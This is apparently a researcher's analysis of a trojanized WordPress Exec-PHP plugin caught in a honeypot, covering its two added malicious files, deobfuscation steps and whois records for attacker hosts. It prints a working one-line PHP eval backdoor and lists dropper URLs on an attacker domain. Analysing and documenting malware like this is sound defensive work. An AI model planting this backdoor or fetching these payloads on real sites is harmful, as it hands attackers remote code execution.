# Kinked Exec-PHP plugin

Apparently, an Exec-PHP plugin exists,
but has been [removed](https://wordpress.org/plugins/exec-php/)
from Worpress.com's official list of plugins because it hasn't been
updated since 2009.

That reconciles with this [exec-php github repository](https://github.com/wp-plugins/exec-php).
It appears that one of the original Exec-PHP's big contributors put the code on Github 
in 2009.
The github repo's latest release is Exec-PHP 4.9,
the same version sported by the kinked plugin documented here.

The kinked Zip file contains two files that don't appear identically
in the exec-php githup repository.
These two files have Zip file dates much later than every other file in the downloade Zip file:

    1851  2017-11-03 14:46   exec-php/wall.php
    2376  2016-11-07 12:18   exec-php/login_wall.php

The file `exec-php/login_wall.php` has contents related to other [login_wall.php files](../login_wall).

These two files are the kink in the Exec-PHP plugin.

## Origin

### IP Address 95.85.38.41

It's a Digital Ocean address. Not much to be learned there.

    inetnum:        95.85.32.0 - 95.85.39.255
    netname:        DIGITALOCEAN-AMS-4
    descr:          Digital Ocean, Inc.
    country:        NL
    created:        2013-11-23T02:11:35Z
    last-modified:  2015-11-20T14:44:10Z

### Download

Downloaded to my honey pot as if the attackers had invoked a real WordPress site's
upload plugin URL (`/wordpress/wp-admin/plugin-install.php?tab=upload`).
As such, the attackers sent a Zip file with the 

## Analysis

The two malicious files in the plugin-download-Zip-file aren't terribly obfuscated.
`login_wall.php` has no obfuscation at all.

### `login_wall.php`

There's some code in here that claims to be a plugin named "Login Wall".
Such a plugin exists, but the only common thing between the real plugin and this
malicious code are a few comments.

It also has a simple backdor:

    if($_GET["login"]=="cmd"){if($_POST['123']==''){echo('->|OK|-<');exit();}eval($_POST['123']);exit();}

If you do an HTTP POST method request, with a URL ending in `?login=cmd`,
the backdoor looks at a POST parameter named "123".
If parameter "123" has no value, the code replies "->|OK|-<",
essentially a simple test of the backdoor.
If parameter "123" has a non-zero-length value, the backdor tries to eval that value as PHP source code.

### `wall.php`

This is a dropper of sorts.

`wall.php`, when executed, tries to download 3 files from somewhere on the web:

    http://ga-google.com/Nic/wu/bob.txt
    http://ga-google.com/Nic/wu/emb.txt
    http://ga-google.com/Nic/wu/plugin.txt

If everything in `wall.php` works correctly, these 3 files end up in 5 files:

* `bob.txt` &rarr; `/wp-admin/user/editor.php`
* `plugin.txt` &rarr; `/wp-admin/includes/plugin-editor.php`
* `bob.txt` &rarr; `/wp-includes/pomo/editor.php`
* `emb.txt` &rarr; `/wp-includes/embes.php`
* `bob.txt` &rarr; `/wp-includes/images/require.png`

### `plugin.txt`

1. `~/src/php/reverse-php-malware/revphp plugin.txt > d2.php`. This basically
concatenates and decodes strings in the source code, simple deobfuscating chores.
2. Edit `d2.php`, change "eval" to "print"
3. `php d2.php > d3.php`

### `bob.txt`

1.  `cp bob.txt a3.php`; edit `a3.php` to include "<?php", change "eval" to "print"
2.  `php a3.php > a4.php`
3.  `~/src/php/reverse-php-malware/pp.php a4.php > a5.php`

## ga-google.com

`whois` says this:

    Domain Name:ga-google.com
    Registry Domain ID:1965912374_domain_com-vrsn
    Registrar WHOIS Server:whois.paycenter.com.cn
    Registrar URL:http://www.xinnet.com
    Updated Date:2018-10-06T00:37:45.00Z
    Creation Date:2015-10-04T08:25:02.00Z
    Registrar Registration Expiration Date:2019-10-04T08:25:02.00Z
    Registrar:XINNET TECHNOLOGY CORPORATION
    Registrar IANA ID:120
    Registrar Abuse Contact Email:supervision@xinnet.com
    Registrar Abuse Contact Phone:+86.1087128064

Xinnet Technology Corporation has very odd information available.
Bloomberg research says this:

> Xin Net Technology Corp. is based in Beijing, China. Xin Net Technology Corp.
> operates as a subsidiary of Global Peopleline Telecom, Inc.

The same Bloomberg research says that Global Peopleline Telecom, Inc.
went out of business in 2011.

Xin Net Tech has a Beijing, China address, while Global Peopleline Telecom
has a Vancouver, Canada address. I smell a rat.

ga-google.com has IP address 209.141.58.97,
and `whois` says this about 209.141.58.97:

    NetRange:       209.141.32.0 - 209.141.63.255
    CIDR:           209.141.32.0/19
    NetName:        PONYNET-04
    NetHandle:      NET-209-141-32-0-1
    Parent:         NET209 (NET-209-0-0-0-0)
    NetType:        Direct Allocation
    OriginAS:       AS53667
    Organization:   FranTech Solutions (SYNDI-5)
    RegDate:        2011-01-27
    Updated:        2012-03-25
    Ref:            https://rdap.arin.net/registry/ip/209.141.32.0

FranTech Solutions appears to be a low-cost VPS vendor.
